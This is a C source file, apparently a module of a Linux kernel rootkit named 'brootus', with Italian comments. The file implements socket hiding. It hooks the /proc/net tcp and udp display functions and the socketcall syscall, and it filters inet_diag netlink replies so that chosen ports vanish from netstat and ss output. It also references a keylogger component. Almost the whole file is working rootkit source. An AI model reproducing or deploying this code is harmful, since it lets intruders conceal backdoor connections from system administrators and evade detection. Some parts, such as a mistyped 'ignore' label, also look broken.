#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/unistd.h> /* Needed for indexing the sys_call_table and other constants */
#include <linux/mm_types.h>
#include <linux/types.h>  /* Needed for linux typedefs, currently not directly in use */
#include <asm/uaccess.h>  /* Needed for copy_from_user */
#include <linux/dirent.h> /* Not needed right here, but we'll stick to that */
#include <linux/sched.h>  /* Needed for task_struct and list makros */
#include <linux/proc_fs.h>  /* Needed for proc operations */
#include <linux/namei.h>  /* Needed for path lookup and nameid-structs */
#include <linux/seq_file.h> /* Needed for seq_file struct */
#include <net/tcp.h>      /* Needed for TCP_SEQ_STATE[...] */
#include <net/udp.h>      /* Needed for udp_seq_afinfo */
#include <linux/inet_diag.h> /* Needed for inet_diag_msg */

#include "kernel_functions.h"
#include "syscall.h"
#include "keylogger.h"
#include "socket_hiding.h"

#define SOCKET_STATE_VISIBLE 0
#define SOCKET_STATE_HIDDEN 1

int socket_hiding_state = SOCKET_STATE_VISIBLE;

 int (*original_tcp4_seq_show)(struct seq_file*, void*);
 int (*original_udp4_seq_show)(struct seq_file*, void*);
 asmlinkage long (*original_socketcall)(int, unsigned long*);
 int (*original_packet_rcv)(struct sk_buff*, struct net_device*,
                            struct packet_type*, struct net_device*);

 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;

 //porte tcp e udp da nascondere
 short hide_tcp_ports[MAX_HIDE_PORTS];
 short hide_udp_ports[MAX_HIDE_PORTS];
 int num_hide_tcp_ports = 0;
 int num_hide_udp_ports = 0;

 void parse_socket_port(char* str_port)
 {
  char* str_port_no = str_port + 1;
  short port_no;

    // stringa lunga abbastanza
  if (strlen(str_port) < 2) {
    goto ignore;
  }

    // estrae il numero di porta
  if (sscanf(str_port_no, "%hd", &port_no) <= 0) {
    goto ignore;
  }

    // analizza il prefisso
  switch (*str_port) {
    case 't':
    case 'T':
    hide_tcp_ports[num_hide_tcp_ports++] = port_no;
    break;
    case 'u':
    case 'U':
    hide_udp_ports[num_hide_udp_ports++] = port_no;
    break;
    case 'a':
    case 'A':
    hide_tcp_ports[num_hide_tcp_ports++] = port_no;
    hide_udp_ports[num_hide_udp_ports++] = port_no;
    break;
    default:
    goto ignore;
  }
  return;

  ignore;
  return;
}

void set_socket_ports(char* ports)
{
  char* c = ports;
  char* pos = strstr(c, ",");

  // resetta la lista
  num_hide_tcp_ports = 0;
  num_hide_udp_ports = 0;

  // divide le porte e le analizza
  while(pos != NULL) {
    *pos = '\0';
    parse_socket_port(c);

    c = pos + 1;
    pos = strstr(c, ",");
  }
  parse_socket_port(c);
}

//funzione ausiliaria per controllare se le poerte sono nella lista delle hiding
 inline int port_in_list(short port, short* list, int size)
 {
  int i;
  for (i = 0; i < size; i++) {
    if (list[i] == port) {
      return 1;
    }
  }
  return 0;
}

inline int hide_tcp_port(short port)
{
  return port_in_list(ntohs(port), hide_tcp_ports, num_hide_tcp_ports);
}

inline int hide_udp_port(short port)
{
  return port_in_list(ntohs(port), hide_udp_ports, num_hide_udp_ports);
}

//visualizza i file tcp hookati
 int brootus_tcp4_seq_show(struct seq_file *seq, void *v)
 {
  struct tcp_iter_state* st;
  struct inet_sock* isk;
  struct inet_request_sock* ireq;
  struct inet_timewait_sock* itw;

  if (v == SEQ_START_TOKEN) {
    return original_tcp4_seq_show(seq, v);
  }

  st = seq->private;

  switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
    case TCP_SEQ_STATE_ESTABLISHED:
    isk = inet_sk(v);
    if (hide_tcp_port(isk->sport) || hide_tcp_port(isk->dport)) {
      return 0;
    }
    break;
    case TCP_SEQ_STATE_OPENREQ:
    ireq = inet_rsk(v);
    if (hide_tcp_port(ireq->loc_port) || hide_tcp_port(ireq->rmt_port)) {
      return 0;
    }
    case TCP_SEQ_STATE_TIME_WAIT:
    itw = inet_twsk(v);
    if (hide_tcp_port(itw->tw_sport) || hide_tcp_port(itw->tw_dport)) {
      return 0;
    }
    default:
    break;
  }
  return original_tcp4_seq_show(seq, v);
}

//file udp hookati
 int brootus_udp4_seq_show(struct seq_file *seq, void *v)
 {
  struct inet_sock* isk;

  if (v == SEQ_START_TOKEN) {
    return original_udp4_seq_show(seq, v);
  }

  isk = inet_sk(v);
  if (hide_udp_port(isk->sport) || hide_udp_port(isk->dport)) {
    return 0;
  }
  return original_udp4_seq_show(seq, v);
}
//trova subdirectory in procsf
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
 {
  struct proc_dir_entry* result = pde->subdir;
  while(result && strcmp(name, result->name)) {
    result = result->next;
  }
  return result;
}

asmlinkage long brootus_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
{
  //chiama la funzione originale
  long ret = fn_sys_recvmsg(fd, umsg, flags);

  // verifica che il file sia una vera socket e la usa
  int err = 0;
  struct socket* s = sockfd_lookup(fd, &err);
  struct sock* sk = s->sk;

  // verifica che la socket sia usata per inet_diag protocol
  if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {

    long remain = ret;

      // Copy data from user space to kernel space
    struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
    int err = copy_from_user(msg, umsg, ret);
    struct nlmsghdr* hdr = msg->msg_iov->iov_base;
    if (err) {
      return ret; // panic
    }

    // itera le entries
    do {
      struct inet_diag_msg* r = NLMSG_DATA(hdr);

      // consideriamo solo le porte tcp perchè le porte udp sono già considerate
      if (hide_tcp_port(r->id.idiag_sport) || hide_tcp_port(r->id.idiag_dport)) {
        //sovrascrivere le entries
        long new_remain = remain;
        struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
        memmove(hdr, next_entry, new_remain);

        // modificare la lunghezza delle variabili
        ret -= (remain - new_remain);
        remain = new_remain;
      } else {
        // skippa la entry
        hdr = NLMSG_NEXT(hdr, remain);
      }
    } while (remain > 0);

    // copai i dati in user space
    err = copy_to_user(umsg, msg, ret);
    kfree(msg);
    if (err) {
      return ret;
    }
  }
  return ret;
}

asmlinkage long brootus_socketcall(int call, unsigned long __user *args)
{
  switch (call) {
    case SYS_RECVMSG:
      return brootus_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
    default:
      return original_socketcall(call, args);
  }
}

void enable_socket_hiding(void)
{
  struct net* net_ns;

  if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
    return;
  }

    // itera i namespace della rete
  list_for_each_entry(net_ns, &net_namespace_list, list) {

    // ottiene le proc entries corrispondenti
    struct proc_dir_entry* pde_net = net_ns->proc_net;
    struct proc_dir_entry* pde_tcp = get_pde_subdir(pde_net, "tcp");
    struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");
    struct tcp_seq_afinfo* tcp_info = pde_tcp->data;
    struct udp_seq_afinfo* udp_info = pde_udp->data;

    //salva e hooka le funzioni tcp
    tcp_hook_fn_ptr = (void**) &tcp_info->seq_ops.show;
    original_tcp4_seq_show = *tcp_hook_fn_ptr;
    *tcp_hook_fn_ptr = brootus_tcp4_seq_show;

    // salva e hooka le funzioni udp
    udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
    original_udp4_seq_show = *udp_hook_fn_ptr;
    *udp_hook_fn_ptr = brootus_udp4_seq_show;
  }

  syscall_table_modify_begin();
  HOOK_SYSCALL(socketcall);
  syscall_table_modify_end();

  socket_hiding_state = SOCKET_STATE_HIDDEN;
}

void disable_socket_hiding(void)
{
  if (socket_hiding_state == SOCKET_STATE_VISIBLE) {
    return;
  }
    // rispristina le funzioni hookate
  *tcp_hook_fn_ptr = original_tcp4_seq_show;
  *udp_hook_fn_ptr = original_udp4_seq_show;

  syscall_table_modify_begin();
  RESTORE_SYSCALL(socketcall);
  syscall_table_modify_end();

  socket_hiding_state = SOCKET_STATE_VISIBLE;
}


void init_socket_hiding(void)
{
  enable_socket_hiding();
}

void finalize_socket_hiding(void)
{
  disable_socket_hiding();
}
